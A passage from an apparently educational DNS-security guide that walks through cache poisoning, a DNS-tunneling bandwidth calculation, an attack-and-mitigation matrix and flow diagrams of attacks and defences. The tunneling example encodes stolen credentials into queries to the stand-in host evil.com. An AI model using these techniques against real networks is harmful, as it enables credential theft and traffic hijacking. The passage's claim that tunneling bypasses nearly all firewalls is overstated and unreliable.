5. The attacker simultaneously **floods** the resolver with **hundreds of forged UDP responses** claiming to be from the authoritative server, attaching a malicious **A record** (e.g., `victim-bank.com → 6.6.6.6`) in the **Additional section**.
6. If the attacker's **source port**, **transaction ID**, and **query name** match before the legitimate response arrives, the resolver **accepts and caches** the malicious glue.
7. All subsequent users querying `www.victim-bank.com` are redirected to **6.6.6.6**.

## 3.4 DNS Tunneling Bandwidth Derivation

### Problem Setup
A malware implant encodes stolen data as **subdomain labels** in DNS queries for `data.evil.com`. Each query label can carry **63 bytes** (RFC 1035 limit), and queries are sent every **0.5 seconds**. What is the **maximum data exfiltration rate**?

### Step 1: Data per Query

$$
D_{query} = 63 \text{ bytes}
$$

### Step 2: Bandwidth Formula

$$
B_{tunnel} = \dfrac{D_{query}}{T_{query}}
$$

### Step 3: Numerical Evaluation

$$
B_{tunnel} = \dfrac{63 \text{ bytes}}{0.5 \text{ s}} = 126 \text{ bytes/s}
$$

Convert to more practical units:

$$
B_{tunnel} \approx 1 \text{ kbps}
$$

> [!NOTE]
> While 1 kbps appears slow, DNS tunneling is **bypasses nearly all firewalls**, making it ideal for stealthy exfiltration of **API keys, credentials, and small configuration files** over weeks or months.

## 3.5 Analytical Comparison Matrix

| Attack Vector | Target Layer | Persistence | Detection Difficulty | Mitigation |
|---|---|---|---|---|
| Cache Poisoning | Recursive Resolver | Until TTL expiry | Hard | DNSSEC, port randomization |
| DNS Hijacking | Registrar / Client | Persistent | Medium | Registry locks, MFA |
| DNS Amplification | Authoritative NS / Victim | Per-attack burst | Easy (volume) | Rate limiting, BCP38 |
| DNS Tunneling | Firewall / Egress | Long-term C2 | Very Hard | Egress filtering, IDS/IPS |
| Kaminsky Attack | Resolver Cache | Until TTL expiry | Medium | Source port randomization, 0x20 encoding |
| DNS Rebinding | Browser SOP | Per-tab | Hard | DNS pinning, rebinding firewalls |
<!-- SECTION_3_END -->

<!-- SECTION_4_START -->
# SECTION 4: Structural Diagrams & Schematics

## 4.1 Normal DNS Resolution Flow

```mermaid
flowchart TD
    A[User Browser] -->|1. Query www.bank.com| B[Local Resolver]
    B -->|2. Query Root Server| C[Root DNS Server]
    C -->|3. Returns .com TLD NS| B
    B -->|4. Query .com TLD| D[TLD Server .com]
    D -->|5. Returns bank.com NS| B
    B -->|6. Query Authoritative| E[bank.com Authoritative NS]
    E -->|7. Returns IP 1.2.3.4| B
    B -->|8. IP 1.2.3.4| A
    A -->|9. HTTPS to 1.2.3.4| F[Legitimate Bank Server]
```

## 4.2 DNS Cache Poisoning Attack Flow (Kaminsky)

```mermaid
flowchart TD
    Attacker[Malicious Attacker] -->|1. Query random.bank.com| Resolver[Recursive DNS Resolver]
    Attacker -->|2. Flood forged responses| Resolver
    Resolver -->|3. Forward query| AuthNS[Authoritative NS bank.com]
    AuthNS -->|4. NXDOMAIN reply| Resolver
    Resolver -->|5. Race condition: accept forgery| PoisonedCache[Poisoned Cache Entry]
    PoisonedCache -->|6. User queries www.bank.com| Resolver
    Resolver -->|7. Returns malicious IP| VictimUser[Innocent User]
    VictimUser -->|8. Connects to fake site| PhishServer[Attacker Phishing Server]
```

## 4.3 DNS Amplification DDoS Architecture

```mermaid
flowchart LR
    Bot1[Bot 1] -->|Spoofed IP = Victim| OpenR1[Open Resolver 1]
    Bot2[Bot 2] -->|Spoofed IP = Victim| OpenR2[Open Resolver 2]
    Bot3[Bot N] -->|Spoofed IP = Victim| OpenR3[Open Resolver N]
    OpenR1 -->|Massive UDP Response| Victim[VICTIM SERVER]
    OpenR2 -->|Massive UDP Response| Victim
    OpenR3 -->|Massive UDP Response| Victim
    Victim -->|Saturation| Outage[Service Outage]
```

## 4.4 DNS Tunneling Exfiltration Chain

```mermaid
flowchart TD
    Malware[Infected Host] -->|Encoded subdomain query: AKIA1234.evil.com| LDNS[Local Resolver]
    LDNS -->|Recursive query| AttackerNS[Attacker NS evil.com]
    AttackerNS -->|Logs subdomain payload| C2Server[Attacker C2 Database]
    C2Server -->|Returns A record as ACK| LDNS
    LDNS -->|Response with next-stage data| Malware
    Malware -->|Sensitive data exfiltrated| Exfil[Stolen Credentials Exfiltrated]
```

## 4.5 DNS Rebinding Attack Lifecycle

```mermaid
flowchart TD
    A[Attacker Registers evil.com] --> B[Attacker DNS returns low TTL]
    B --> C[Victim Browser resolves evil.com to 1.2.3.4]
    C --> D[Malicious JS binds domain to internal IP 192.168.1.1]
    D --> E[SOP Bypass: browser re-resolves to 192.168.1.1]
    E --> F[Attacker now reads LAN via browser same-origin policy]
    F --> G[Exfiltrate internal router / IoT data]
```

## 4.6 Defense-in-Depth Architecture for DNS Security

```mermaid
flowchart TD
    Client[Client Endpoint] -->|Encrypted DNS| DoH[DNS over HTTPS Resolver]
    DoH -->|Validated chain| DNSSEC[DNSSEC Validating Resolver]
    DNSSEC -->|Authenticated response| AuthNS[Authoritative NS with DNSSEC]
    AuthNS -->|Signed zone| DNSSEC
    DNSSEC --> RPZ[Response Policy Zone Firewall]
    RPZ -->|Malicious domain blocked| Block[BLOCK]
    RPZ -->|Legitimate domain| DoH
    DoH --> Client
    AuthNS --> Anycast[Anycast Network Scrubbing]
    Anycast --> Mitigation[DDoS Mitigation Layer]
    Mitigation --> AuthNS
```
